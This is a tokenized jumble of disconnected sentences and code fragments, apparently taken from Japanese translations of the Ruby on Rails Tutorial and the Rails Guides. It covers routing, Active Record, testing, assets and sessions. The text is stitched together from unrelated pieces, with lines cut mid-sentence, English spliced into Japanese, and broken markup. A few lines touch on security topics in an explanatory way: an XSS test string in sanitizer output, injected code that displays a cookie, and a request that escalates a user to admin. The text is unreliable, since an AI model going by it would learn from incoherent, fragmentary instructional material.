▁ここでは 、 Rails の 組み込み 関数 \ k ode { stylesheet _ link _ tag } ▁( 詳細は \ href { http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method - i - stylesheet _ link _ tag } { Rails ▁API } を参照 ) ▁ を使用して 、\ k ode { application ▖ css } を すべての \ href { http :// www ▖ w 3 ▖ org / T R / CSS 2 / media ▖ html } { メディアタイプ } に インクルード しています ▁( メディアタイプ には 、 コンピュータ の 画面 や 印 刷 画面 など も含まれます ) 。
▁ 言 う まで も なく 、` Engine ` クラス に ` isolate _ namespace ` を持つ エンジン で この bin / rails を使用して 生成 した もの はすべて 名前空間化され る ことにご注意ください 。
▁1 つの 方法は 、 id と 名前 を 組み合わせ て \ k ode {@ 1 - michael - hartl } のように することです 。
▁class ▁Create Order s ▁< ▁ActiveRecord :: Migration
▁$ ▁bundle ▁exec ▁rake ▁- T
▁ これまで の例では すべて \ emph { ダブルクォート 文字列 } を使用して いました が 、 Ruby では \ emph { シングルクォート } も サポート しています 。
▁ ルーティング は 作成し ましたが 、 ルーティング 先 の コントローラ が まだ ありません 。
▁ が 無 事 に 動 きました !
▁ わざと 無効な \ k ode { params } ハッシュ を使用して セッション 用 パス に POST する
▁xml ▖ p ub Date ( item _ p ub Date ( item ) )
▁def ▁start
▁### ▁` blank ?` と ` present ?`
▁ Connection : ▁keep - al ive
▁class ▁C of fe e ▁< ▁ActiveRecord :: Base
▁ ╼ ▁* ▁------------ ---------------- ---------------- ---------------- ---------------- ╼ ▁* /
▁この クラスは 役に立 つ 例として 提供され ましたが 、 Rails にとって 極めて 重要な 部分 である \ emph { 永 続 性 } という 要素 が 欠 け ていました ▟ Rails コンソール で User クラスの オブジェクトを 作 って も 、 コンソール から ex it すると そのオブジェクト は すぐに 消え てしまい ました 。
▁ リレーションシップ の 基本的な アクセス制御 に対するテスト
▁<%= ▁f ▖ label ▁: text ▁%>< br >
▁-> ▁0▖0 1 15 s
▁# ▁=> ▁1▖ 000 , 000 %
▁self を省略した 結果を リスト \ ref { code : default _ gitignore } に示します 。
▁class ▁G oodnessValidator
▁* ▁` force _ p l ur al ` は 、 モデル名 を 複数形 にする かどうかを指定します 。
▁ パスワード 再設定 用 リソース を追加する
▁* ▁` to _ ary ` から 返 された 値が ` nil ` でも ` Array ` オブジェクト でも ない場合 、` K ernel # Array ` は 例外を発生 します が 、` Array ▖ wrap ` は 例外を発生 せずに 単 に その 値 を返します 。
▁ ネストした リソース の中で さらに 別の リソース を ネスト することは 可能です 。
▁* ▁ 未 実行 の マイグレーション がない か 確認し ます ▟ 未 実行 の もの が あった 場合は 、` ActiveRecord :: P end ing Migration Error ` を 発生 さ ます 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁less ▁than ▁or ▁equal ▁to ▁% { count } " _ ▁ です 。
▁render ▁layout : ▁false
▁上の 3 つの ERB は 、 それぞれ スタイルシート 、 JavaScript 、 {0} csrf _ meta _ tags {/0} メソッドを ページ 内で 展開 する ためのものです ▟ スタイルシート と JavaScript は 、 Asset ▁Pipeline ▁( { p 1 }) ▁ の一部 です ▟ csrf _ meta _ tags は 、 Web 攻 撃 手法 のひとつ である \ href { http :// en ▖ w ikipedia ▖ org / wiki / C ross - site _ request _ forgery } { ク ロスサイトリクエストフォージェリ ー } ▁( cross - site ▁request ▁ forgery : ▁CSRF ) を防ぐ ために 使われ る Rails の メソッドです 。
▁ 特定の ` where ` 句 で ` unscope ` を指定することもできます 。
▁% w ( Earth )▖ to _ sentence ▁# ▁=> ▁" Earth "
▁self を省略した 結果を リスト \ ref { code : bootstrap _ css } に示します 。
▁* ▁ マッチする URL パターン
▁<%= ▁f ▖ text _ field ▁: title ▁%>
▁` collection ▖ delete ` メソッドは 、 結合テーブル 上の レコード を削除し 、 それによって 1 つ または 複数の オブジェクトを コレクション から 削除します 。
▁" true " および " false " を Ruby の定義 どおり に使用する 場合は 、 通常の フォント で 表 記 すること 。
▁#### ▁ ネストした 関連付け を結合する ▁( 単 一 レベル )
▁ な ぜ これが ズ ル な のか という と 、 何 と \ k ode { sign _ in } は この時点では 存在してい ないので す 。
▁ メッセージ は 7 2 文字 目 で 改行 してください 。
▁これ を実装する ために Active ▁Record の \ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } } メソッドを 利用 します ▟ このメソッドは 、 ある 特定の 時点 で 呼び出される メソッドです 。
▁もちろん 、 ▖ gitignore など を 適切に 利用 すれば 、 そう した 機 密 情報を 適切に 扱 う ことができます ▟ しかし そのために は それ なり の 経験 が必要 であり 、 慣 れ た 開発者 でも ときに 扱 い を 間 違 え てしまう こと があり え る のです 。
▁ 編集 の 成功 に対するテスト
▁get ▁' profile ', ▁to : ▁' users # show '
▁# ▁< id ▁type =" integer "> 4 58 3 </ id >
▁その 逆に 、 ユーザーが サインイン していない ときは これらの リンク が 表示 \ emph { されない } ことを確認する テスト も 追加 してください 。
▁</ body >
▁ これはリスト \ ref { code : home _ feed _ test } で使用されていました 。
▁hash [: b ] [: d ] ▁== ▁[ 3 , ▁4 ] ▁# ▁=> ▁true
▁t ▖ next _ quarter ▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010
▁# ▁< url - id > a ar on - b at al ion </ url - id >
▁* ▁` ActiveSupport :: Cache :: S trategy :: Local Cache ` は 基本的な メモリ バ ッ ク アップ 式 キャッシュ として 機能 します 。
▁第 2 版 と の違い について
▁<% ▁content _ for ▁: stylesheets ▁do ▁%>
▁ 大 改 訂 を 行った \ emph { Ruby ▁on ▁Rails チュートリアル } 第 3 版 が 、 以前の 版 よりも さらに 多くの 読者 にとって 役 立 つ ことを 願 っています 。
▁ ルーティング が 定義された ので 、 Help 、 About 、 Contact ページの テストはパスするはずです 。
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁& block ) ▁ { ▁ stuff ; ▁result ▁= ▁block ▖ call ; ▁ stuff ▁ }
▁この 更新 には 、 領 域 ▁( div タグ ) ▁ の 追加 、 CSS クラスの 追加 、 サイト ナビゲーション の 起 点 となる 領 域 の 追加 も含まれます 。
▁ 例を 挙 げ ます ▟ RedCloth は ▁` _ test _ ` という マークアップ を & lt ; em & gt ; test & lt ; em & gt ; に変換 します ▟ この 箇所 の テキスト は イ タ リ ッ ク になります 。
▁< し ば ら く 待 つ >
▁* ▁` has _ many ▁: through `
▁\ k ode { shuffle } メソッドを \ k ode { String } クラス に追加する ための 骨 組み 。
▁╼╼\ begin { figure }╼\ begin { center }╼\ image box { images / figures / login _ page _ protected _ mockup ▖ png }╼\ end { center }╼\ caption { A ▁mockup ▁of ▁the ▁result ▁of ▁visit ing ▁a ▁ protected ▁page \ label { fig : login _ page _ protected _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { ユーザーに ログインを要求 する } ▁% ▁( fold )╼ ▁\ label { sec : requiring _ logged _ in _ users }╼╼
▁### ▁ Update
▁# ▁ 非 JS / CSS ファイルが 追加 済み ) ▁config ▖ assets ▖ precompile ▁ += ▁% w ( ▁search ▖ js ▁ )
▁これで 、` / photos ` への ` GET ` リクエスト は 成功 し 、` / photos ` ▁ への ` POST ` リクエスト ▁( 通常 であれば ` create ` アクションに ルーティング されます ) ▁ は 失敗します 。
▁TIP : ▁SQL インジェクション の詳細については [ Ruby ▁on ▁Rails セキュリティ ガイド ]( security ▖ html # sql インジェクション ) を参照してください 。
▁\ k ode { Users } ではなく \ k ode { User } と した の はこの ためです 。
▁ データベース上の 記憶トークン は 暗号化 されているので 、 cookies から 取り出し た 記憶トークン は 、 データベース上の 記憶トークン を検索する 前に 暗号化 する 必要がある 点に注意 してください 。
▁この コマンドは 、 単 に データベース を更新し 、\ k ode { users } データモデル を作成する ためのものです
▁third :
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full \_ title } ▁method ▁is ▁\ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { automagically } ▁available ▁in ▁all ▁our ▁views ▖
▁ モデル については 、 エンジンの 作成 について 解説 する セクション で 後 述 します 。
▁ 書かれた
▁**` ActionDispatch :: Session :: CookieStore ` **
▁╼╼ ▁\ subsection { コメント } ▁% ▁( fold )╼ ▁\ label { sec : comments }╼╼ Ruby ▁\ emph { comments } ▁start ▁with ▁the ▁p ound ▁sign ~\ k ode { \ # } ▁( also ▁called ▁the ▁`` hash ▁mark '' ▁or ▁( more ▁ po e tic ally ) ▁the ▁`` o c to th or pe '') ▁and ▁extend ▁to ▁the ▁end ▁of ▁the ▁line ▖
▁` has _ one ` 関連付け の場合は 、 その 宣言 が 行われている モデルのインスタンス が 、 他 方のモデル のインスタンス を 「 まるごと 含 んで い る 」 または 「 所有 している 」 こと を示します 。
▁def ▁comment _ params
▁def ▁time _ since _ created
▁config ▖ assets ▖ digest が true に設定され ている 場合 、 ファイル名 に フィンガープリント が追加され ます 。
▁これ を行わ なかった場合 、 Rails で エラーが発生し ます 。
▁( や や 長 く て 応用 的な 設定 なので 、 リスト \ ref { code : guard file } を コ ピ ペ し てしまった 方が よいでしょう )
▁` indent !` メソッドは インデント を その 場 で ▁( 破 壊 的に ) ▁ 行います 。
▁ デフォルトの ルート ファイル の内容を 見 てみると 、 かなり 乱 雑 になっています ▟ しかし 、 それら はすべて コメントアウト された ルート マッピング の例 であり 、 必要な 乱 雑 さ です 。
▁ここでは 、 Unix コマンド の \ k ode { l s } で \ k ode { app / controllers / } ディレクトリ の 中 身 を表示し た 後 、\ k ode { rm } コマンドを う っかり 実行 して この ディレクトリ を削除し てしまった とします ▁({1}{2} 表 1 ▖ 1 {/2}{/1} ) 。
▁[ 3 ▖ 4 , ▁- 45 ▖ 6 ] ▖ to _ query (' sample ')
▁orphan ▖ name ▁# ▁=> ▁" M "
▁( 実 を 言 う と 、 この \ href { http :// www ▖ railstutorial ▖ org } { Ruby ▁on ▁Rails チュートリアル Web サイト } も Heroku 上 に置かれ ています ▟ 本チュートリアル を オンライン で 読んで い る のであれば 、 まさに Heroku に ホスティング された Web サイト を見 ている という ことになります ) 。
▁ これら 以外の オプション を渡すと 、 バリデータ クラス に ` options ` として 渡 されます 。
▁ これはリスト \ ref { code : password _ resets _ resource } で使用されていました 。
▁ 私 も Rails が どうやって この URL を取得し ている のか 、 パ ッ と 思い 出 す ことはできません でした ▟ そこで 、 Google で ▁“ rails ▁request ▁previous ▁url ” ▁ と 検索 し 、\ href { http :// stack overflow ▖ com / questions / 4 6 5 2 08 4/ ruby - on - rails - how - do - you - get - the - prev i ous - url } { Stack ▁Overflow の スレッド } を見つけ 、 この 答 え に 至 りました 。
▁text _ area (: comment , ▁: text , ▁size : ▁" 20 x 30 ")
▁` multiple _ of ?` メソッドは 、 レシーバの 整 数 が 引数 の 倍 数 である かどうか をテストします 。
▁ ログイン に 失敗した ときの フラッシュメッセージ
▁add ( # { severity }, ▁message , ▁ prog name , ▁& block ) ▁# ▁add ( D E B U G , ▁message , ▁ prog name , ▁& block )
▁JavaScript は ページ 上の 情報を 更新 することもできます 。
▁さらに よく ないこと に 、\ emph { followers } の方 を モデリング するときに も 、 同じ ぐらい 無 駄 の 多 い \ k ode { followers } テーブル を 別 に 作成し なければ なら なくなってしまいます 。
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 16 : 44 ▁GMT
▁この ディレクトリ の 機能 については 『 Rails アプリケーション を設定する 』 ガイド の [ イニシャライザ ファイル を使用する ]( configuring ▖ html # イニシャライザ ) を参照してください ▟ エンジンの イニシャライザ は 、 アプリケーションの ` config / initializers ` ディレクトリ に置かれている イニシャライザ と まったく 同様に 動作します 。
▁\ ref { sec : a _ users _ resource } で 、\ k ode { resources ▁: users } を \ k ode { routes ▖ rb } ファイル に追加する と ▁( リスト \ ref { code : users _ resource }) ▁ 自動的に Rails アプリケーションが 表 \ ref { table : RESTful _ users } の RESTful ▁ URI ▁ に応答する ようになった ことを思い出してください 。
▁#### ▁number _ to _ phone
▁` squish ` メソッドは 、 冒 頭 と 末 尾 の ホワイトスペース を 除 去 し 、 連続 した ホワイトスペース を 1 つ に 減 ら します 。
▁このメソッドは ブロック を 1 つ 取り ます 。
▁Ruby の ブロック は ▁( 他の 似 た 機能 と 比 べ ) ▁ 柔 軟 な 機能 で 、 添 え 字 を使った データ構造 よりも 自然に イ テ レ ー ション が できる
▁Rails インストーラ ▁( Windows )
▁この \ k ode { session } メソッドは ハッシュ のように 扱 え るので 、 以下のように 代入 します 。
▁| ▁app / assets / stylesheets / comment ▖ css ▖ scss ▁| ▁ コントローラ 用の CSS ▁( カ ス ケ ー デ ィ ング スタイルシート ) ▁ ファイル ▁|
▁D ir ▖ ch d ir ( Rails ▖ application ▖ root )
▁\ ref { sec : format _ validation } で説明する メールアドレス の フォーマット に関する バリデーション では 、 こういった 長さ の検証 は できない ので 、 本 節 で 長さ に関する バリデーション を事前に 追加 しておきます 。
▁以下の コマンドを実行 することで 、 すべて 正常に インストール できた かどうかを確認 できます 。
▁ Flash メッセージ の キー は 文字列 と 比 較 してください 。
▁ この章 の 最初に 、 フォローしているユーザー の ページ 表示 の 流れ について 説明しました 。
▁ 多くの コンピュータ プログラム では 、 以下のような 記 法 で 変数 の 値を 1 つ 増 や す ことができます 。
▁つまり 、 有効なメールアドレス だけ にマッチし て 、 無効な メールアドレス には \ emph { マッチ しない } 正規表現 を 組み 立 て る必要があります 。
▁number ▁= ▁1
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ k ode { assigns } メソッドは 本チュートリアル 初 登 場 です ▟ {3} 第 {1} 8 {/1} 章 {/3} の演習 ▁(\ ref { sec : sign _ in _ out _ exercises }) ▁ で 説明したように 、\ k ode { assigns } メソッドを使用すると 、 対応する アクション 内にある インスタンス変数 にアクセス できるようになります 。
▁ 画像アップロード に対するテスト は 、 演習 に回します ▁(\ ref { sec : micropost _ exercises }) 。
▁リスト \ ref { code : validates _ presence _ of _ name } は 一見 魔 法 のように 見え る かもしれませんが 、\ k ode { validates } は単なる メソッドです 。
▁* ▁` lock _ version ` ▁- ▁ モデルに [ optimistic ▁ lock ing ]( http :// api ▖ rubyonrails ▖ org / classes / ActiveRecord / Lock ing ▖ html ) を追加します
▁( 実際 、\ text tt { routes ▖ rb } ▁ ファイルに 自動的に 追加 された コード も 元に戻す 必要があります ) ▁ 。
▁* ▁ リクエストを 処理 する 度 に データベース への コ ネ ク ション を コ ネ ク ション プール に 返します ▟ ` env [' rack ▖ test ']` ▁ が ▁` true ` で ない場合 のみ 返 却 が 行われます 。
▁` config ▖ autoload _ once _ paths ` のデフォルト 値は 、 空の 配列 です 。
▁ そして 、 アプリケーションの コントローラに 以下のコード が あるとします 。
▁Ruby や Rails の お勧め 書 籍 : ▁ 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby }}」( P eter ▁Cooper ▁ 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist }}」( David ▁A ▖ ▁B la c k 著 ) 、 「\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby }}」( Russ ▁O l s en 著 ) 、 Ruby を さらに 深 く 学ぶ のであれば ▁ 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way }}」( H al ▁F ul to n 著 ) ▁ がお勧めです 。
▁` ~ / my - test - app ` で生成された アプリケーションは ローカル ブランチ のコード を実行します ▟ サーバーを再起動 すると 、 設定 の 変更を アプリケーションで 確 認 できます 。
▁--------- - -
▁╼╼ ▁\ subsection { インストール と セットアップ } ╼ ▁\ label { sec : git _ setup }╼╼
▁ 再度 Rails コンソール を開き 、 コンソール 上で の 作業を もう一度 や り 直 してみてください
▁ ルーティング の詳細については 、 本ガイド の [ Rails のルーティング ]( routing ▖ html ) を参照してください 。
▁ 条件 を上書き する
▁\ k ode { microposts } テーブルに は \ k ode { user _ id } カラム を作成して あった ので 、 それによって Rails と Active ▁Record が マイクロポスト と ユーザーを 関連付け る ことができる ようになっています 。
▁ MySpace の 本 物 の Web ページ コンテンツ は 特殊な HTML / CSS によって 覆 い 隠 され 、 独自の 偽 ログイン ページを 代りに 表示 しました 。
▁ 変更 が 終わったら 、 ブランチ の状態 を 確認し てみましょう 。
▁Spork を使う 上で ひとつ 注意 があります ▟ pre for k で 読み込む ファイル ▁( たとえば \ k ode { routes ▖ rb }) ▁ が変更され た場合 、 Spork サーバーを再起動 して 新しい Rails の 環境 を再度 読み込む 必要があります 。
▁さらに 、 他の 開発者 と 共 同 作業 を行う 場合に このような ファイルを バージョン管理 に含め ると 無 用 な 衝 突 ▁( conflict ) ▁ が発生し 、 関係 者 一 同 が 無 用の スト レ ス に さ ら される こと になり か ね ません 。
▁ デフォルトの ルート ルーティング ▁( コメントアウト された 状態 )
▁create _ table ▁: customers ▁do ▁| t |
▁* ▁` active _ record ▖ initialize _ database `: ▁ データベース 設定 を ` config / database ▖ yml ` ( デフォルトの 読み込み 元 ) から 読み込み 、 現在の 環境で 接続 を 確 立 します 。
▁この Web サイト では 、 Sass ではなく LESS を使って 変数 が 定義 されています が 、\ text tt { bootstrap - sass } という gem を使用すれば 、 Sass でも 同様 の 変数 が 使える ようになります 。
▁### ▁ デフォルトの 出力 : ▁ アクション における 「 設定 より 規 約 」
▁ ルート URL のような ルーティング を定義する こと の 効果 は 、 ブラウザから アクセス し や す く すること だけ ではありません ▟ それ 以外に も 、 生の URL ではなく 名前付きルート を使って URL を参照 すること が できるようになります ▟ which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL ▖ ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁create ▁app / views / static _ pages / help ▖ html ▖ erb
▁ここで も パーシャル を使用して コードを き れ い に しましょう 。
▁Rails によって 多数の ファイル が作成され ました 。
▁config / environments / production ▖ rb
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁これらの コード により 、 ユーザープロファイル を表示し て 、 ページを 更新 せずに フォロー または フォロー解除 が できる ようになった はずです ▟ テストスイート も パスするはずです 。
▁この オブジェクトは 、 渡された 属性 で インスタンス化され 、 その 結合テーブル を 介 して リンク が 作成されます ▟ ただし 、 関連付けられたオブジェクト は この時点では 保存 s 慣 れ て _ いない _ ことにご注意ください 。
▁\ k ode { about } 用の ルート を追加する ▁ RE D {3} { 4 } {/4} { 4 } { 5 } { /5}{/ 4 } { 4 } {/4} {/3}
▁ 疑 わ しい 場合には 公式 ドキュメント など 、 信 頼 できる 情報 源 を参照 すること 。
▁\ chapter { ほぼ 静的なページ の作成 }╼\ label { cha : static _ pages }╼╼
▁リスト \ ref { code : f _ error _ messages } では エラーメッセージ パーシャル が \ k ode {@ user } 変数 を直接 参 照 して いた ことを思い出してください ▟ 今回は 代わりに \ k ode {@ micropost } 変数 を使う 必要があります 。
▁ 言い 換 え ると 、 本書 で 扱 う トピック の 範囲 が \ emph { 広 い } という ことで もあります ▟ もし まだ 十分 な プログラミング 経験 を 持 って いない のであれば 、 その 情報 量 の 多 さ に 圧 倒 される かもしれません 。
▁ ルーティングヘルパー の グループ に プレフィックス を追加する には 、 以下のように ` scope ` メソッドで `: as ` オプション を使用します 。
▁[ Contribut or ▖ first , ▁ Comm it ▖ first ] ▖ to _ xml
▁* ▁` config / routes ▖ rb ` ファイル
▁ 『 \ href { http :// www ▖ railstutorial ▖ org / book }{\ emph { Ruby ▁on ▁Rails チュートリアル : ▁Rails で Web 開発 を学ぶ } } 』 へ よう こ そ 。
▁* ▁ 空欄 の配列 と ハッシュ
▁Rails を使用して Web アプリケーションを 立 ち 上 げ たり 実行 したり する うえで 助 け が必要 に なったら 、 以下の サポート 用 リソース を 自由に 参 照 できます 。
▁controller : ▁' welcome ',
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁orders _ count ▁> ▁10 ▁OR DER ▁BY ▁name ▁DESC
▁` collection ▖ exists ?` メソッドは 、 指定された 条件 に 合 う オブジェクトが コレクション の中に 存在する かどうかをチェックします 。
▁Over write ▁ / my app / config / routes ▖ rb ?
▁このとき 、 英語 式 の C UT も フ ラン ス 式 の T U C も 満 場 一 致 と な らず 、 両者 の 妥協 案 として UT C という 略 語 が 採 用 されました 。
▁( 演習 は \ href { http :// en ▖ w ikipedia ▖ org / wiki / Bo s s _ ( video _ g a m ing ) # M in i bo s s } { 中 ボ ス } です ) 。
▁" product "▖ camelize ▁# ▁=> ▁" Product "
▁create ▁app / views / welcome
▁# ▁Use ▁U g li fi er ▁as ▁ compressor ▁for ▁JavaScript ▁assets
▁ スクリーンキャスト ▁( 英語 ) ▁ は ▁\ href { http :// railstutorial ▖ org /}{ Ruby ▁on ▁Rails チュートリアル Web サイト } ( 英語 版 ) で 購 入 できます 。
▁ コメント 行 にも 書 いて ある とおり 、 Capybara を使用して いない と フォーム への 自動 入力 が 動作 しません ▟ このような 場合に 備えて 、 ユーザー から \ k ode { no _ c a p y a bar a : ▁true } オプションを 渡 せる ように し 、 デフォルトの サインイン メソッド を上書き して cookies を直接 操作 できるようにします ▟ ユーザー情報 記 憶 用の トークン を cookies ▁( ク ッ キー ) ▁ に保存 しておきます ▟ As ▁noted ▁in ▁the ▁comment ▁line , ▁ filling ▁in ▁the ▁form ▁doesn ’ t ▁work ▁when ▁not ▁using ▁Capybara , ▁so ▁to ▁cover ▁this ▁case ▁we ▁allow ▁the ▁user ▁to ▁pass ▁the ▁option ▁\ k ode { no _ c a p y a bar a : ▁true } ▁to ▁override ▁the ▁default ▁signin ▁method ▁and ▁manipulate ▁the ▁cookies ▁directly ▖
▁ コンパイル された アセット は 、` config ▖ assets ▖ prefix ` で 指定された 場所に 保存されます 。
▁# ▁=> ▁"< script > alert (1) </ script > "
▁Rails の コンポーネント 名 は 語 の 間 に スペース を 1 つ 置く 表 記 を 正 式 な もの と する ▁( 例 : ▁" Active ▁Support ")
▁╼╼ ▁% ▁subsection ▁ modeling _ users ▁( end )╼╼ ▁\ subsection { マイクロポストの モデル 設計 } ▁% ▁( fold )╼ ▁\ label { sec : modeling _ demo _ microposts }╼╼
▁file _ field _ tag ▁' attachment '
▁ 常に という わけではありません が 、 変更を 過 去 の 安 定 版 の メ ン テ ナ ン ス 用に バックポート できる と よい 場合 があります 。
▁else
▁</ p >
▁=> ▁ { : user => { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example ▖ com "} }
▁ 名前空間 を 分 離 する ということは 、` bin / rails ▁g ▁model ` の実行 によって 生成された モデル ▁( ここでは ▁` bin / rails ▁g ▁model ▁article ` を実行し た とします ) ▁ は ` Article ` に な らず 、 名前空間化され て ` Blorgh :: Article ` になる ということです 。
▁PostgreSQL データベースの メモリ ー 使用 量 が 上 限 に 達 した 場合は 、` state ment _ limit ` の 値を 小 さ く するか P repared ▁Statements をオフに してください 。
▁config / routes ▖ rb ▁# ▁ Y E S
▁この コードを 自分の Web アプリケーションの 適 当 な 場所に 手動で 注入 すると 、 その ページ に含まれている 自身 の cookie が表示される のが わかります 。
▁最後に 、 本書 では RSpec を使った テストを 繰り返し 実 施 していきます ▟ です から 、 もし 途中 で よく 分 から ない テストが あった としても 、 読み 飛 ば して 先に 進 む ことをお勧めします ▟ 1 、2 章 先 を 読み 進 め た 後に 読み 返 してみる と 、 当 初 は よく 分 から なかった テストが 、 実は と ても シ ン プ ル であること を 理解 できる はずです
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / integer / multiple ▖ rb ` です 。
▁` app / assets / images ` に置かれている 画像 アセット への URL を算出 します 。
▁ body : ▁email ▖ body
▁In ▁Chapter ▁\ ref { cha : sign _ up }, ▁this ▁will ▁become ▁the ▁user ▁signup ▁page ▖
▁ この種の ミ ス は まさに 、 テストで キャッチ すべき エラー です 。
▁この テストが パス するためには 、 User の ルート ( リスト \ ref { code : users _ resource }) と User の ▁\ k ode { show } アクション ( リスト \ ref { code : user _ show _ action }) 、 そして \ k ode { show ▖ html ▖ erb } ビュー ( リスト \ ref { code : user _ show _ view _ with _ gravatar }) が それぞれ 正しく 動いている 必要があります 。
▁* ▁` f in is her _ hook `: ▁ アプリケーションの 初期化 プロセス 完了 後に 実行される フック を 提供し 、 アプリケーション や railties や エンジンの ` config ▖ after _ initialize ` ブロック も すべて 実行 します 。
▁@ @ author _ class ▖ constantize
▁ 逆に 、 バリデーション を行なう 条件 を 複 数 定義 したい場合 、` Array ` を使用できます 。
▁ メール ヘッダー の フィールド 名 と 値 の ペ ア を ハッシュ に まとめて 渡す こともできます し 、` headers [: field _ name ] ▁= ▁' value ' ` のように 呼び出す こともできます 。
▁* ▁`: polymorphic ` 関連付け と併用する ことはできません 。
▁これは 、 作成する ときに 渡す オプション と スコープ ブロック で 簡単に カスタマイズ できます 。
▁### ▁ モデル を生成する
▁ 「\ k ode { < }」 は ここでは 「 〜 より 早い 時刻 」 と 読んで ください ▟ これ なら 「 パスワード 再設定 メールの 送信 時刻 が 、 現在 時刻 より 2 時間 以上 前 の場合 」 となり 、
▁上の 例 で 、 Supplier から 代 表 ( Re present a tive ) を `@ supplier ▖ account ▖ representative ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 Supplier から Account への 関連付け に Re present a tive を あ ら か じ め include しておくこと で 無駄な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁ 最終的な フィード の実装 は や や 込 み 入 っている ため 、 細 か い 部品 を 1 つ ずつ 確かめ ながら 導 入 していきます 。
▁この リクエスト は 、 ユーザー 番号 17 番 を 管理者 に 変 え てしまいます ▟ ユーザーの この 行 為 は 、 少なくとも 重大な セキュリティ 違 反 となる 可能性があります し 、 実際には それ だけで は 済 ま ない でしょう 。
▁* ▁ 「 控 え め な JavaScript 」 について
▁# ▁Use ▁ SCSS ▁for ▁stylesheets
▁#### ▁file _ field _ tag
▁ ファイルの 変更 が終わった ので 、 マ ス ター ブランチ に この 変更を \ emph { マージ ▁( merge )} ▁ します 。
▁* ▁` load _ environment _ config ` ▁ 現在の 環境 に ` config / environments ` を 読み込み ます 。
▁ 大文字 小文字 を 無視 する オプション
▁次に 、 マイクロポストの \ k ode { create } アクションを 作り 始 め ましょう ▟ この アクション も 、 リスト \ ref { code : user _ create _ action } のユーザー 用 アクション と似ています ▟ 違い は 、 新しいマイクロポスト を \ k ode { build } するために user / micropost 関連付け を使用している 点 です ▁( リスト \ ref { code : microposts _ create _ action }) 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / to _ query ▖ rb ` です 。
▁リスト \ ref { code : signup _ form } で定義した フォーム を理解する ために 、 小さな コード に分け て 考えてみましょう 。
▁ コマンドラインで 以下のように 記憶トークン を生成する ことで 、 上の テストが パス するようになります 。
▁* ▁ ユ ニ ー ク な id を生成し て ` X - Request - I d ` ヘッダー に設定し ます ▟ ` ActionDispatch :: Request # u u id ` メソッド も 同 一 の id を利用して います 。
▁* ▁** 外部キー ** ▁- ▁この カラム は ▁` テーブル名 の 単数形 _ id ` ▁ に する必要があります ▁( 例 ▁` item _ id `、` order _ id ` )
▁ ディレクトリ の 移動
▁JavaScript を サポート しない ブラウザ を サポート する 必要がある 場合は 、 フォーム と \ text tt { POST } リクエスト を使用して \ text tt { DELETE } リクエストを 偽 造 することもできます ▟ こちら は JavaScript が なくても 動作します ▟ 詳細については RailsCast の 「\ href { http :// r ailscasts ▖ com / episodes / 7 7 - destroy - with out - javascript } { JavaScript を使用し ない で 削除 する ( 英語 ) }」 を参照してください 。
▁この節で の目的は 、 簡単に 消え ること の ない ユーザーの モデルを 構 築 することです 。
▁$ ▁rails ▁generate ▁controller ▁StaticPages ▁ home ▁help ╼ ▁$ ▁rails ▁destroy ▁controller ▁StaticPages ▁ home ▁help
▁\ ref { sec : generated _ static _ pages } で 説明したように 、\ k ode { home } という アクションは \ k ode { home ▖ html ▖ erb } という ビュー に 関連付け られます ▟ この ビュー は \ k ode { app / views / static _ pages } に あるので 、 ここに \ k ode { about ▖ html ▖ erb } という ファイルを 作 れば よ さ そう です 。
▁詳細については 、[ gem の Re ad me ]( https :// github ▖ com / rails / rails - html - sanitizer ) を参照してください 。
▁デフォルトは ` 1 ` です 。
▁リスト \ ref { code : from _ users _ followed _ by _ final } を も って 、 ステータスフィード の実装 は 完了 です 。
▁C ▖ descendants ▁# ▁=> ▁[ B , ▁A ]
▁この 課題 は 大 して 難 しく ないので 、\ ref { sec : log _ in _ out _ exercises } の演習 に 回 す ことにします ▟ さ し あ た って 、 今は 関連する cookies が \ k ode { nil } である かどうか だけ を チェック すれば よい ことにします 。
▁ 既存の `: no doc : ` 指定 は む や み に変更し ないでください 。
▁ すなわち 、 この \ k ode { test } メソッドは 文字列 ▁( 説明 文 ) ▁ と ブロック を 引数に と り 、 テストが 実行される ときに ブロック 内の 文 が 実行される 、 ということ が 理解 できます 。
▁account
▁ Firefox と C h r o me を使った 具 体 例 で 考えてみましょう ▟ ユーザーが Firefox から ログアウト すると 、\ k ode { user ▖ forget } メソッド によって 記憶ダイジェスト が \ k ode { nil } になります ▁( リスト \ ref { code : user _ model _ forget }) 。
